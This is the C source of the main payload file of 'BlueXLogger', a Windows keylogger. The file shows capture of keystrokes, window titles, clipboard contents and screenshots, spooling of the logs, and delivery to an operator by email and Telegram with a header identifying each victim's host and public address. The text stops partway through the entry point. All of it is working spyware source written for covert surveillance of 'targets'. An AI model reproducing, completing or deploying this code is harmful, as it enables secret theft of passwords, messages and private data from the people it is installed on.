/*============================================================================
 * BlueXLogger - src/payload/main.c
 * Payload entry point and runtime engine.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Architecture
 * ------------
 *   main thread    - window-less message pump, hotkey handling, lifecycle
 *   capture thread - WH_KEYBOARD_LL hook + raw input + message pump
 *   worker thread  - drains events, formats, spools, screenshots, delivers
 *
 * Nothing on the capture path performs I/O, so hook latency stays low and the
 * OS never silently unhooks the callback.
 *==========================================================================*/
#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_util.h"
#include "bxl_format.h"
#include "bxl_schedule.h"
#include "bxl_logbuf.h"
#include "bxl_mime.h"
#include "bxl_smtp.h"
#include "bxl_identity.h"
#include "bxl_telegram.h"
#include "bxl_screenshot.h"
#include "bxl_context.h"
#include "bxl_capture.h"
#include "bxl_persist.h"

#define BXL_HOTKEY_ID        0xB10C
#define BXL_QUIT_HOTKEY_ID   0xB10D
#define BXL_MAX_PENDING      512

/*==========================================================================
 * Runtime context
 *========================================================================*/
typedef struct PendingItem {
    wchar_t path[MAX_PATH * 2];
    char    filename[256];
    char    mime[64];
    size_t  size;
    int     is_shot;
    int     delivered;
} PendingItem;

typedef struct PayloadCtx {
    BxlConfig       cfg;
    BxlSmtpConfig   smtp;
    BxlTelegramConfig tg;
    BxlIdentity     id;
    BxlSched        sched;
    BxlLogBuf       lb;
    BxlCapture      cap;
    BxlContextCache ctxcache;
    BxlFmtOptions   fmtopt;
    BxlModState     modstate;
    BxlShotOptions  shotopt;

    wchar_t exe_path[MAX_PATH * 2];
    wchar_t storage[MAX_PATH * 2];

    HANDLE  worker;
    HANDLE  stop_evt;
    HANDLE  mutex;

    volatile LONG paused;
    volatile LONG shutdown;

    int pause_hotkey_registered;
    int quit_hotkey_registered;

    unsigned last_dropped;

    PendingItem pending[BXL_MAX_PENDING];
    int         pending_count;

    unsigned    shots_taken;
    unsigned    messages_sent;
    unsigned    messages_failed;
    bxl_u64     last_purge_ms;
    int         configured;
} PayloadCtx;

static PayloadCtx g_ctx;

/*==========================================================================
 * Storage layout
 *========================================================================*/
static int resolve_storage(PayloadCtx *p)
{
    if (p->cfg.storage_dir[0]) {
        if (bxl_utf8_to_wide(p->cfg.storage_dir, p->storage,
                             BXL_COUNT_OF(p->storage)))
            return BXL_TRUE;
    }
    if (bxl_path_temp_dir(p->storage, BXL_COUNT_OF(p->storage))) {
        wchar_t joined[MAX_PATH * 2];
        if (SUCCEEDED(StringCchPrintfW(joined, BXL_COUNT_OF(joined),
                                       L"%s\\%s", p->storage, BXL_PRODUCT_NAME_W))) {
            StringCchCopyW(p->storage, BXL_COUNT_OF(p->storage), joined);
            return BXL_TRUE;
        }
    }
    return BXL_FALSE;
}

/*==========================================================================
 * Pending queue
 *========================================================================*/
static int pending_add(PayloadCtx *p, const wchar_t *path, const char *filename,
                       const char *mime, size_t size, int is_shot)
{
    PendingItem *it;

    if (p->pending_count >= BXL_MAX_PENDING) {
        bxl_logf("pending queue full - dropping oldest entry");
        /* Drop the oldest so the queue cannot grow without bound. */
        memmove(&p->pending[0], &p->pending[1],
                sizeof(PendingItem) * (BXL_MAX_PENDING - 1));
        p->pending_count = BXL_MAX_PENDING - 1;
    }

    it = &p->pending[p->pending_count++];
    memset(it, 0, sizeof(*it));
    StringCchCopyW(it->path, BXL_COUNT_OF(it->path), path);
    if (filename) bxl_str_copy(it->filename, sizeof(it->filename), filename);
    if (mime)     bxl_str_copy(it->mime, sizeof(it->mime), mime);
    it->size    = size;
    it->is_shot = is_shot;
    return BXL_TRUE;
}

/* Re-queue everything already on disk from a previous run. */
static void recover_pending(PayloadCtx *p)
{
    wchar_t (*paths)[MAX_PATH * 2];
    int count, i;

    paths = (wchar_t (*)[MAX_PATH * 2])calloc(BXL_MAX_BATCHES,
                                              sizeof(*paths) * 1);
    if (!paths) return;

    count = bxl_logbuf_scan(&p->lb, paths, BXL_MAX_BATCHES);
    for (i = 0; i < count; i++) {
        size_t sz = (size_t)bxl_file_size(paths[i]);
        pending_add(p, paths[i], NULL, NULL, sz, 0);
        bxl_sched_note_log_queued(&p->sched);
    }
    free(paths);

    if (count > 0)
        bxl_logf("recovered %d undelivered log batch(es) from disk", count);

    /* Screenshots from a previous run. */
    {
        WIN32_FIND_DATAW fd;
        HANDLE h;
        wchar_t pattern[MAX_PATH * 2];

        if (SUCCEEDED(StringCchPrintfW(pattern, BXL_COUNT_OF(pattern),
                                       L"%s\\%s_*", p->storage,
                                       BXL_PRODUCT_NAME_W))) {
            h = FindFirstFileW(pattern, &fd);
            if (h != INVALID_HANDLE_VALUE) {
                int shots = 0;
                do {
                    wchar_t full[MAX_PATH * 2];
                    char name8[256];
                    int is_jpg;

                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (!bxl_path_join(full, BXL_COUNT_OF(full), p->storage,
                                       fd.cFileName))
                        continue;

                    bxl_wide_to_utf8(fd.cFileName, name8, sizeof(name8));
                    is_jpg = bxl_str_icontains(name8, ".jpg") ||
                             bxl_str_icontains(name8, ".jpeg");

                    pending_add(p, full, name8,
                                is_jpg ? "image/jpeg" : "image/png",
                                (size_t)bxl_file_size(full), 1);
                    bxl_sched_note_shot_queued(&p->sched);
                    shots++;
                } while (FindNextFileW(h, &fd) && shots < BXL_MAX_PENDING);
                FindClose(h);

                if (shots > 0)
                    bxl_logf("recovered %d undelivered screenshot(s)", shots);
            }
        }
    }
}

/*==========================================================================
 * Keystroke handling
 *========================================================================*/
static void handle_events(PayloadCtx *p, const BxlKeyEvent *evs, int count)
{
    BxlBuf  text;
    BxlKeyEvent batch[256];
    int     i, n;

    if (count <= 0) return;
    if (!bxl_buf_init(&text, 1024)) return;

    for (i = 0; i < count; i += (int)BXL_COUNT_OF(batch)) {
        n = BXL_MIN((int)BXL_COUNT_OF(batch), count - i);
        memcpy(batch, evs + i, sizeof(BxlKeyEvent) * (size_t)n);
        bxl_buf_reset(&text);
        bxl_fmt_apply_all(&p->modstate, &p->fmtopt, batch, (size_t)n, &text);
        if (text.len > 0)
            bxl_logbuf_append(&p->lb, text.data, text.len);
    }

    bxl_sched_note_keystrokes(&p->sched, (bxl_u32)count);
    bxl_buf_free(&text);
}

static void handle_context(PayloadCtx *p)
{
    BxlContext cur;

    bxl_context_get(&p->ctxcache, &cur);
    bxl_logbuf_note_context(&p->lb, cur.process, cur.title, bxl_unix_time());
}

static void handle_clipboard(PayloadCtx *p)
{
    char buf[8192];
    BxlBuf wrapped;

    if (!p->cfg.clipboard_capture) return;
    if (!bxl_capture_take_clipboard_request(&p->cap)) return;

    /* Give the source application a moment to publish the new content. */
    Sleep(120);

    if (!bxl_read_clipboard(buf, sizeof(buf))) return;
    if (buf[0] == '\0') return;

    if (!bxl_buf_init(&wrapped, 256)) return;
    bxl_fmt_clipboard(&wrapped, buf, strlen(buf));
    bxl_logbuf_append(&p->lb, wrapped.data, wrapped.len);
    bxl_buf_free(&wrapped);
}

/*==========================================================================
 * Collection
 *========================================================================*/
static void collect_log(PayloadCtx *p)
{
    wchar_t batch[MAX_PATH * 2];
    size_t  bytes = 0;

    if (!bxl_logbuf_seal(&p->lb, batch, BXL_COUNT_OF(batch), &bytes))
        return;

    pending_add(p, batch, NULL, NULL, bytes, 0);
    bxl_sched_note_log_queued(&p->sched);
    bxl_logf("collected log batch (%llu bytes)", (unsigned long long)bytes);
}

static void collect_shots(PayloadCtx *p)
{
    bxl_u32 i, count = p->cfg.shot_max_count ? p->cfg.shot_max_count : 1;
    unsigned taken = 0;

    if (!p->cfg.shot_enabled) return;

    for (i = 0; i < count; i++) {
        BxlShot shot;
        wchar_t wname[256];
        wchar_t full[MAX_PATH * 2];
        HANDLE  h;
        DWORD   written = 0;

        if (!bxl_screenshot_capture(&p->shotopt, NULL, &shot)) {
            bxl_logf("screenshot capture failed");
            break;
        }

        if (!bxl_utf8_to_wide(shot.filename, wname, BXL_COUNT_OF(wname))) {
            bxl_shot_free(&shot);
            break;
        }
        if (!bxl_path_join(full, BXL_COUNT_OF(full), p->storage, wname)) {
            bxl_shot_free(&shot);
            break;
        }

        h = CreateFileW(full, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            bxl_shot_free(&shot);
            break;
        }

        if (WriteFile(h, shot.data, (DWORD)shot.len, &written, NULL) &&
            written == (DWORD)shot.len) {
            pending_add(p, full, shot.filename, shot.mime_type,
                        shot.len, 1);
            bxl_sched_note_shot_queued(&p->sched);
            taken++;
            p->shots_taken++;
        }
        CloseHandle(h);
        bxl_shot_free(&shot);

        /* A single "burst" is one frame unless the operator asked for more. */
        if (count > 1) Sleep(250);
    }

    if (taken)
        bxl_logf("collected %u screenshot(s)", taken);
}

/*==========================================================================
 * Delivery
 *========================================================================*/
/* Name the full-log document after the machine and the moment, so a chat that
 * receives several targets' logs does not show ten files all called
 * "BlueXLogger.txt". ASCII only: Telegram displays the name verbatim. */
static void tg_log_filename(const PayloadCtx *p, char *out, size_t out_cch)
{
    char stamp[32];
    bxl_format_timestamp_compact(bxl_unix_time(), stamp, sizeof(stamp));
    StringCchPrintfA(out, out_cch, "%s_%s_%s.txt", BXL_PRODUCT_NAME,
                     p->id.hostname[0] ? p->id.hostname : "host", stamp);
}

/*
 * The identity header that opens every Telegram digest and every full-log
 * document. It is plain text on purpose: the Telegram layer escapes the whole
 * body itself and wraps it in a single <pre> block, so adding tags here would
 * only produce literal "<b>" in the chat.
 *
 * This block is the whole reason the identity exists - one glance says which
 * machine, which account and which address a delivery came from.
 */
static int tg_append_identity(const PayloadCtx *p, BxlBuf *out)
{
    char block[1024];

    bxl_identity_block(&p->id, block, sizeof(block));
    if (!bxl_buf_appends(out, block)) return BXL_FALSE;
    bxl_buf_appends(out, "\r\n");
    return BXL_TRUE;
}

static int deliver_group(PayloadCtx *p, int *log_indices, int log_count,
                         int *shot_indices, int shot_count, int daily)
{
    BxlBuf      body;
    BxlBuf      html;
    BxlAttachment atts[BXL_MAX_ATTACHMENTS];
    void       *att_bufs[BXL_MAX_ATTACHMENTS];
    BxlMessage  msg;
    BxlSmtpResult res;
    int         i;
    int         att_count = 0;
    int         email_ok = BXL_TRUE;
    int         tg_ok    = BXL_TRUE;
    int         want_email, want_tg, want_shot_files;

    want_email = (p->cfg.channel == BXL_CHANNEL_EMAIL ||
                  p->cfg.channel == BXL_CHANNEL_BOTH);
    want_tg    = (p->cfg.channel == BXL_CHANNEL_TELEGRAM ||
                  p->cfg.channel == BXL_CHANNEL_BOTH);
    /* Telegram can carry its own copy of the screenshots; that switch is
     * independent of whether e-mail wants them. */
    want_shot_files = want_email || (want_tg && p->tg.send_screenshots);

    memset(atts, 0, sizeof(atts));
    memset(att_bufs, 0, sizeof(att_bufs));

    /* Best effort and cached: the first delivery pays for the lookup, every
     * later one reads the stored answer. A failure leaves "unknown" and never
     * blocks the delivery. */
    bxl_identity_resolve_public(&p->id, 2500);

    if (!bxl_buf_init(&body, 8192)) return BXL_FALSE;
    if (!bxl_buf_init(&html, 8192)) { bxl_buf_free(&body); return BXL_FALSE; }

    /* ---- concatenate the log batches ----------------------------------- */
    for (i = 0; i < log_count; i++) {
        BxlBuf chunk;
        if (!bxl_buf_init(&chunk, 4096)) continue;
        if (bxl_file_read_all(p->pending[log_indices[i]].path, &chunk)) {
            bxl_buf_append(&body, chunk.data, chunk.len);
            if (chunk.len && chunk.data[chunk.len - 1] != '\n')
                bxl_buf_appends(&body, "\r\n");
        }
        bxl_buf_free(&chunk);
    }

    /* With separate_emails the screenshots travel alone, and an empty text
     * part is legal MIME but reads as a broken message in most clients. */
    if (body.len == 0 && shot_count > 0) {
        bxl_buf_appends(&body,
                        "Screenshots attached. The keystroke log is delivered "
                        "in a separate message.\r\n");
    }

    /* ---- load screenshot attachments ----------------------------------- */
    if (want_shot_files) {
        for (i = 0; i < shot_count && att_count < BXL_MAX_ATTACHMENTS; i++) {
            const PendingItem *it = &p->pending[shot_indices[i]];
            BxlBuf file;

            if (!bxl_buf_init(&file, 65536)) continue;
            if (!bxl_file_read_all(it->path, &file)) {
                bxl_buf_free(&file);
                continue;
            }

            att_bufs[att_count] = bxl_buf_detach(&file, NULL);
            bxl_buf_free(&file);
            if (!att_bufs[att_count]) continue;

            bxl_str_copy(atts[att_count].filename,
                         sizeof(atts[att_count].filename), it->filename);
            bxl_str_copy(atts[att_count].mime_type,
                         sizeof(atts[att_count].mime_type), it->mime);
            atts[att_count].data = att_bufs[att_count];
            atts[att_count].len  = it->size;
            att_count++;
        }
    }

    /* ---- e-mail --------------------------------------------------------- */
    if (want_email) {
        memset(&msg, 0, sizeof(msg));
        bxl_str_copy(msg.from, sizeof(msg.from), p->cfg.sender);
        bxl_str_copy(msg.to, sizeof(msg.to), p->cfg.recipient);
        bxl_mime_make_subject(msg.subject, sizeof(msg.subject),
                              p->cfg.subject_prefix, &p->id, bxl_unix_time());
        if (daily)
            StringCchCatA(msg.subject, sizeof(msg.subject), " [DAILY]");
        msg.date_unix = bxl_unix_time();

        msg.body_text     = body.data;
        msg.body_text_len = body.len;
        msg.atts          = atts;
        msg.att_count     = (size_t)att_count;

        if (p->cfg.html_body) {
            /* HTML escaping can expand a character to six bytes ("&quot;"),
             * so size the scratch buffer accordingly rather than guessing. */
            size_t need = body.len * 6 + 8192;
            char  *tmp  = (char *)malloc(need);

            if (tmp) {
                if (bxl_mime_make_body_html(tmp, need, &p->id, bxl_unix_time(),
                                            body.data, body.len,
                                            (unsigned)att_count)) {
                    bxl_buf_reset(&html);
                    if (bxl_buf_append(&html, tmp, strlen(tmp))) {
                        msg.body_html     = html.data;
                        msg.body_html_len = html.len;
                    }
                }
                free(tmp);
            }
        }

        if (bxl_smtp_send(&p->smtp, &msg, &res)) {
            p->messages_sent++;
            bxl_logf("mail delivered: %d log batch(es), %d attachment(s)",
                     log_count, att_count);
        } else {
            p->messages_failed++;
            email_ok = BXL_FALSE;
            bxl_logf("mail delivery failed after %d attempt(s): %s",
                     res.attempts, res.error);
        }
    }

    /* ---- Telegram ------------------------------------------------------- */
    if (want_tg) {
        BxlBuf        digest;
        BxlTgFile     tgfiles[BXL_MAX_ATTACHMENTS + 1];
        size_t        tgfile_count = 0;
        BxlTelegramResult tres;
        char          subject[BXL_MAX_SUBJECT + 32];
        char          fname[256];
        size_t        head = 0;
        void         *txt_buf = NULL;
        size_t        txt_len = 0;
        int           sent_doc = 0;
        int           oom = 0;
        int           digest_init = 0;

        memset(tgfiles, 0, sizeof(tgfiles));
        fname[0] = 0;

        /* The Telegram layer escapes the whole body and wraps it in one <pre>
         * block, so this buffer holds plain text only - see tg_append_identity. */
        if (bxl_buf_init(&digest, body.len + 4096)) {
            digest_init = 1;
        } else {
            oom = 1;
        }

        if (!oom) {
            bxl_mime_make_subject(subject, sizeof(subject),
                                  p->cfg.subject_prefix, &p->id,
                                  bxl_unix_time());
            if (daily)
                StringCchCatA(subject, sizeof(subject), " [DAILY]");
            if (!tg_append_identity(p, &digest)) oom = 1;
        }

        if (!oom && p->tg.full_log_file && body.len > 0) {
            /* A big log belongs in the document, not in a dozen chat bubbles.
             * The message carries a readable head; the document carries the
             * whole thing, and Telegram's in-app text viewer opens it in one
             * tap with a download button beside it. */
            head = (body.len > 1200) ? 1200 : body.len;
            bxl_buf_append(&digest, body.data, head);

            tg_log_filename(p, fname, sizeof(fname));

            /* The document is the identity header plus the complete log, so
             * the viewer and a downloaded copy show identical bytes. */
            {
                BxlBuf full;
                if (bxl_buf_init(&full, body.len + 4096)) {
                    if (!tg_append_identity(p, &full)) oom = 1;
                    bxl_buf_append(&full, body.data, body.len);
                    txt_buf = bxl_buf_detach(&full, &txt_len);
                    bxl_buf_free(&full);
                } else {
                    oom = 1;
                }
            }

            if (!oom && txt_buf) {
                bxl_str_copy(tgfiles[tgfile_count].filename,
                             sizeof(tgfiles[tgfile_count].filename), fname);
                bxl_str_copy(tgfiles[tgfile_count].mime,
                             sizeof(tgfiles[tgfile_count].mime), "text/plain");
                tgfiles[tgfile_count].data = txt_buf;
                tgfiles[tgfile_count].len  = txt_len;
                tgfile_count++;
                sent_doc = 1;

                if (head < body.len) {
                    bxl_buf_appendf(&digest,
                        "\r\n[%llu bytes total - the complete log is attached "
                        "as %s and opens in one tap]",
                        (unsigned long long)body.len, fname);
                }
            }
        } else if (!oom) {
            bxl_buf_append(&digest, body.data, body.len);
        }

        /* Screenshots ride along when the operator asked for them. */
        if (!oom && p->tg.send_screenshots) {
            for (i = 0; i < att_count && tgfile_count < BXL_COUNT_OF(tgfiles); i++) {
                if (!atts[i].data || !atts[i].len) continue;
                bxl_str_copy(tgfiles[tgfile_count].filename,
                             sizeof(tgfiles[tgfile_count].filename),
                             atts[i].filename);
                bxl_str_copy(tgfiles[tgfile_count].mime,
                             sizeof(tgfiles[tgfile_count].mime),
                             atts[i].mime_type);
                tgfiles[tgfile_count].data = atts[i].data;
                tgfiles[tgfile_count].len  = atts[i].len;
                tgfile_count++;
            }
        }

        if (oom) {
            tg_ok = BXL_FALSE;
            bxl_logf("telegram delivery skipped: out of memory");
        } else if (bxl_telegram_send_digest(&p->tg, subject, digest.data,
                                            tgfile_count ? tgfiles : NULL,
                                            tgfile_count, &tres)) {
            p->messages_sent++;
            bxl_logf("telegram delivered: %d file(s)%s",
                     (int)tgfile_count, sent_doc ? " (full log attached)" : "");
        } else {
            p->messages_failed++;
            tg_ok = BXL_FALSE;
            bxl_logf("telegram delivery failed at stage %d (http %d): %s",
                     tres.stage, tres.http_status,
                     tres.error[0] ? tres.error : tres.last_line);
        }

        if (txt_buf) free(txt_buf);
        if (digest_init) bxl_buf_free(&digest);
    }

    for (i = 0; i < att_count; i++) free(att_bufs[i]);
    bxl_buf_free(&html);
    bxl_buf_free(&body);

    /* With BOTH, a failure on one channel must not lose the other channel's
     * delivery, but it must still be reported as a failure so the spool keeps
     * the item for a retry. */
    return email_ok && tg_ok;
}

/* Drop every item flagged as delivered, preserving order. */
static void pending_compact(PayloadCtx *p)
{
    int r, w = 0;
    for (r = 0; r < p->pending_count; r++) {
        if (p->pending[r].delivered) continue;
        if (w != r) p->pending[w] = p->pending[r];
        w++;
    }
    p->pending_count = w;
}

static int deliver_pending(PayloadCtx *p, int daily)
{
    int log_idx[BXL_MAX_PENDING];
    int shot_idx[BXL_MAX_PENDING];
    size_t budget = p->cfg.max_attach_bytes;
    int any_sent = BXL_FALSE;
    int rounds = 0;

    while (p->pending_count > 0 && rounds++ < 64) {
        int    log_count = 0, shot_count = 0;
        size_t used = 0;
        int    i, k, ok;

        /* Every queued log batch goes in this message. Screenshots fill up to
         * the attachment budget; anything that does not fit is left for the
         * next message, which is how Gmail's 25 MB ceiling is respected. */
        for (i = 0; i < p->pending_count; i++) {
            if (p->pending[i].is_shot) {
                if (shot_count >= BXL_MAX_ATTACHMENTS) continue;
                if (shot_count > 0 && used + p->pending[i].size > budget)
                    continue;
                used += p->pending[i].size;
                shot_idx[shot_count++] = i;
            } else {
                log_idx[log_count++] = i;
            }
        }

        if (log_count == 0 && shot_count == 0) break;

        if (p->cfg.separate_emails) {
            /* Two messages: the readable digest on its own, then the images.
             * That is the point of the option - a recipient who filters or
             * archives screenshots no longer loses the log text with them,
             * and a text-only digest stays small enough to read on a phone.
             * Indices stay valid across both sends because marking an item
             * delivered and deleting its file does not move anything in the
             * array; the compaction happens once, at the end. */
            if (log_count > 0) {
                ok = deliver_group(p, log_idx, log_count, NULL, 0, daily);
                if (!ok) {
                    bxl_sched_note_delivery_failed(&p->sched, bxl_now_ms());
                    break;
                }
                any_sent = BXL_TRUE;
                for (k = 0; k < log_count; k++) {
                    p->pending[log_idx[k]].delivered = 1;
                    bxl_logbuf_delete_batch(p->pending[log_idx[k]].path);
                }
                bxl_sched_note_delivered(&p->sched, (bxl_u32)log_count, 0);
            }

            if (shot_count > 0) {
                ok = deliver_group(p, NULL, 0, shot_idx, shot_count, daily);
                if (!ok) {
                    bxl_sched_note_delivery_failed(&p->sched, bxl_now_ms());
                    /* The logs in this round did go out, so drop them before
                     * stopping or the next cycle would send them again. */
                    pending_compact(p);
                    break;
                }
                any_sent = BXL_TRUE;
                for (k = 0; k < shot_count; k++) {
                    p->pending[shot_idx[k]].delivered = 1;
                    bxl_file_delete(p->pending[shot_idx[k]].path);
                }
                bxl_sched_note_delivered(&p->sched, 0, (bxl_u32)shot_count);
            }

            pending_compact(p);
            if (shot_count == 0) break;
            continue;
        }

        ok = deliver_group(p, log_idx, log_count, shot_idx, shot_count, daily);
        if (!ok) {
            bxl_sched_note_delivery_failed(&p->sched, bxl_now_ms());
            break;
        }

        any_sent = BXL_TRUE;
        for (k = 0; k < log_count; k++)
            p->pending[log_idx[k]].delivered = 1;
        for (k = 0; k < shot_count; k++)
            p->pending[shot_idx[k]].delivered = 1;

        for (k = 0; k < log_count; k++)
            bxl_logbuf_delete_batch(p->pending[log_idx[k]].path);
        for (k = 0; k < shot_count; k++)
            bxl_file_delete(p->pending[shot_idx[k]].path);

        pending_compact(p);
        bxl_sched_note_delivered(&p->sched, (bxl_u32)log_count,
                                 (bxl_u32)shot_count);

        /* Logs are always fully drained in round one; only leftover
         * screenshots can keep the loop going. */
        if (shot_count == 0) break;
    }

    return any_sent;
}

/*==========================================================================
 * Housekeeping
 *========================================================================*/
static void maybe_purge(PayloadCtx *p, bxl_u64 now_ms)
{
    if (now_ms - p->last_purge_ms < 3600000ULL) return;
    p->last_purge_ms = now_ms;

    if (p->cfg.retention_days > 0) {
        bxl_u32 deleted = 0;
        bxl_logbuf_purge(&p->lb, p->cfg.retention_days, &deleted);
        if (deleted)
            bxl_logf("purged %u expired spool file(s)", deleted);
    }
}

/*==========================================================================
 * Worker thread
 *========================================================================*/
static DWORD WINAPI worker_proc(LPVOID param)
{
    PayloadCtx *p = (PayloadCtx *)param;
    BxlKeyEvent evs[512];
    HANDLE      wait_handles[2];

    bxl_logf("worker: started");

    if (p->cfg.shot_enabled) {
        if (!bxl_screenshot_init())
            bxl_logf("worker: screenshot subsystem unavailable");
    }

    wait_handles[0] = bxl_capture_event(&p->cap);
    wait_handles[1] = p->stop_evt;

    while (!p->shutdown) {
        bxl_u64 now_ms   = bxl_now_ms();
        bxl_u64 now_unix = bxl_unix_time();
        bxl_u64 wait_ms  = bxl_sched_ms_until_next(&p->sched, now_ms, now_unix);
        DWORD   wr;
        bxl_u32 acts;
        int     n;

        wr = WaitForMultipleObjects(2, wait_handles, FALSE, (DWORD)wait_ms);
        if (wr == WAIT_OBJECT_0 + 1) break;

        now_ms   = bxl_now_ms();
        now_unix = bxl_unix_time();

        /* Drain on EVERY wake, not only when the data event was what woke us.
         *
         * The scheduler wakes this loop on a timeout when an interval elapses,
         * and keystrokes typed since the previous wake-up are still sitting in
         * the capture ring at that moment. Draining only when the data event
         * fired - as this loop used to - meant collect_log() sealed the spool
         * before those events were ever written to it, so the newest
         * keystrokes were systematically left out of the batch that was about
         * to be delivered. They would surface one batch later, which reads as
         * "my latest typing never arrives". */
        for (;;) {
            n = bxl_capture_drain(&p->cap, evs, (int)BXL_COUNT_OF(evs));
            if (n <= 0) break;
            if (!p->paused) {
                handle_events(p, evs, n);
                handle_context(p);
                handle_clipboard(p);
            }
        }

        /* Ring-buffer overflow is the one capture failure an operator cannot
         * see in the log: the hook drops rather than blocks, so the keys simply
         * never appear. Report it when the count moves instead of letting the
         * loss stay invisible. */
        {
            unsigned hook_n = 0, raw_n = 0, dropped = 0;
            bxl_capture_stats(&p->cap, &hook_n, &raw_n, &dropped);
            if (dropped != p->last_dropped) {
                bxl_logf("capture: %u event(s) dropped by queue overflow - "
                         "the worker is not keeping up",
                         dropped - p->last_dropped);
                p->last_dropped = dropped;
            }
        }

        acts = bxl_sched_tick(&p->sched, &p->cfg, now_ms, now_unix);

        if (acts & BXL_ACT_LOG)  collect_log(p);
        if (acts & BXL_ACT_SHOT) collect_shots(p);
        if (acts & BXL_ACT_FLUSH)
            deliver_pending(p, (acts & BXL_ACT_DAILY) ? 1 : 0);

        maybe_purge(p, now_ms);
    }

    /* ---- graceful shutdown: spool whatever is still buffered ------------ */
    bxl_logf("worker: shutting down");
    {
        BxlKeyEvent tail[256];
        int n;
        for (;;) {
            n = bxl_capture_drain(&p->cap, tail, (int)BXL_COUNT_OF(tail));
            if (n <= 0) break;
            handle_events(p, tail, n);
        }
    }

    {
        wchar_t batch[MAX_PATH * 2];
        size_t  bytes = 0;
        if (bxl_logbuf_seal(&p->lb, batch, BXL_COUNT_OF(batch), &bytes)) {
            pending_add(p, batch, NULL, NULL, bytes, 0);
            bxl_sched_note_log_queued(&p->sched);
        }
    }

    /* One last delivery attempt, then leave anything undelivered on disk. */
    if (p->pending_count > 0) {
        bxl_logf("worker: final delivery attempt (%d item(s))",
                 p->pending_count);
        deliver_pending(p, 0);
    }

    if (p->pending_count > 0)
        bxl_logf("worker: %d item(s) remain spooled for the next run",
                 p->pending_count);

    if (p->cfg.shot_enabled) bxl_screenshot_shutdown();

    bxl_logf("worker: stopped");
    return 0;
}

/*==========================================================================
 * Self-test mode
 *========================================================================*/
static int run_selftest(PayloadCtx *p, const wchar_t *report_path)
{
    BxlBuf out;
    wchar_t shot_path[MAX_PATH * 2];
    char    hostname[128];
    int ok = BXL_TRUE;

    bxl_hostname(hostname, sizeof(hostname));

    if (!bxl_buf_init(&out, 4096)) return 1;

    bxl_buf_appends(&out, BXL_PRODUCT_NAME " self-test\r\n");
    bxl_buf_appends(&out, BXL_WATERMARK "\r\n");
    bxl_buf_appends(&out, "========================================\r\n\r\n");

    bxl_buf_appendf(&out, "exe            : %ls\r\n", p->exe_path);
    bxl_buf_appendf(&out, "storage        : %ls\r\n", p->storage);
    bxl_buf_appendf(&out, "configured     : %s\r\n",
                    p->configured ? "yes" : "NO (placeholder / sidecar missing)");
    bxl_buf_appendf(&out, "recipient      : %s\r\n", p->cfg.recipient);
    bxl_buf_appendf(&out, "smtp           : %s:%u (tls mode %u)\r\n",
                    p->cfg.smtp_host, (unsigned)p->cfg.smtp_port,
                    (unsigned)p->cfg.tls_mode);
    bxl_buf_appendf(&out, "log interval   : %u min / %u keystrokes\r\n",
                    p->cfg.log_interval_min, p->cfg.log_keystroke_threshold);
    bxl_buf_appendf(&out, "shot interval  : %u min (enabled=%u)\r\n",
                    p->cfg.shot_interval_min, p->cfg.shot_enabled);
    bxl_buf_appendf(&out, "persistence    : %s\r\n",
                    bxl_persist_name(p->cfg.persistence));
    bxl_buf_appends(&out, "\r\n");

    /* -- screenshot ------------------------------------------------------- */
    bxl_screenshot_init();
    if (bxl_screenshot_capture_to_file(&p->shotopt, hostname, p->storage,
                                       shot_path, BXL_COUNT_OF(shot_path))) {
        bxl_buf_appendf(&out, "screenshot     : OK -> %ls (%llu bytes)\r\n",
                        shot_path,
                        (unsigned long long)bxl_file_size(shot_path));
    } else {
        bxl_buf_appends(&out, "screenshot     : FAILED\r\n");
        ok = BXL_FALSE;
    }

    /* -- capture engine --------------------------------------------------- */
    if (bxl_capture_start(&p->cap, p->cfg.capture_raw_input)) {
        int waited = 0, total = 0;
        BxlKeyEvent evs[256];

        bxl_buf_appendf(&out, "capture engine : OK (hook=%s raw=%s)\r\n",
                        p->cap.hook ? "installed" : "absent",
                        p->cap.raw_registered ? "registered" : "absent");

        while (waited < 2500) {
            int n;
            Sleep(100);
            waited += 100;
            for (;;) {
                n = bxl_capture_drain(&p->cap, evs, (int)BXL_COUNT_OF(evs));
                if (n <= 0) break;
                total += n;
            }
        }
        bxl_buf_appendf(&out, "events seen    : %d in 2.5 s\r\n", total);

        if (total > 0) {
            BxlBuf sample;
            BxlModState st;
            BxlFmtOptions fo;
            if (bxl_buf_init(&sample, 256)) {
                bxl_fmt_default_options(&fo);
                bxl_fmt_init(&st, &fo);
                bxl_fmt_apply_all(&st, &fo, evs, 1, &sample);
                bxl_buf_appendf(&out, "sample         : %s\r\n", sample.data);
                bxl_buf_free(&sample);
            }
        }
        bxl_capture_stop(&p->cap);
    } else {
        bxl_buf_appends(&out, "capture engine : FAILED\r\n");
        ok = BXL_FALSE;
    }

    bxl_buf_appends(&out, "\r\nRESULT: ");
    bxl_buf_appends(&out, ok ? "PASS" : "FAIL");
    bxl_buf_appends(&out, "\r\n");

    {
        HANDLE h = CreateFileW(report_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w = 0;
            WriteFile(h, out.data, (DWORD)out.len, &w, NULL);
            CloseHandle(h);
        }
    }

    bxl_buf_free(&out);
    return ok ? 0 : 1;
}

/*==========================================================================
 * Entry point
 *========================================================================*/
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPWSTR lpCmdLine,
                    int nCmdShow)
{
    PayloadCtx *p = &g_ctx;
    wchar_t     report[MAX_PATH * 2];
    int         selftest = 0;
    MSG         msg;

    BXL_UNUSED(hInstance);
    BXL_UNUSED(hPrev);
    BXL_UNUSED(nCmdShow);

    if (lpCmdLine && wcsstr(lpCmdLine, L"--selftest")) selftest = 1;

    bxl_path_exe(p->exe_path, BXL_COUNT_OF(p->exe_path));

    /* ---- configuration -------------------------------------------------- */
    p->configured = bxl_config_load_effective(&p->cfg, p->exe_path);
    if (!p->configured) {
        bxl_config_defaults(&p->cfg);
        if (!selftest) {
            /* Nothing to deliver to - stay dormant rather than misbehave. */
            return 0;
        }
    }

    /* ---- single instance ------------------------------------------------ */
    /* Optional and off by default in the builder: the operator decides whether
     * a second copy should be refused or should run alongside the first. The
     * configuration therefore has to be read before this point, which is why
     * the mutex is no longer the first thing the process does. */
